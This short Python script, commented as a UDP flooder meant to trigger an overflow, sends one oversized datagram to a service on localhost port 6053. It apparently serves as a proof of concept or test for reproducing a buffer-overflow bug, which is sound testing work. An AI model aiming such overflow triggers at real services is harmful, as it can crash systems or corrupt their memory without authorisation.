# UDP flooder to trigger overflow
#!/usr/bin/env python3
import socket
import time
TARGET_IP = "127.0.0.1"
TARGET_PORT = 6053
PAYLOAD_SIZE = 500
def main():
    time.sleep(1)
    payload = b"X" * PAYLOAD_SIZE
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(payload, (TARGET_IP, TARGET_PORT))
    print(f"Sent {PAYLOAD_SIZE} bytes to {TARGET_IP}:{TARGET_PORT}")

if __name__ == "__main__":
    main()